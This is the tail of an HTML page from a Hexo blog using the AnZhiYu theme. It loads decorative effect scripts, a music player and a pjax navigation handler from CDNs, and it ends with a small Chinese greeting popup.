</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="500" mobile="false" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>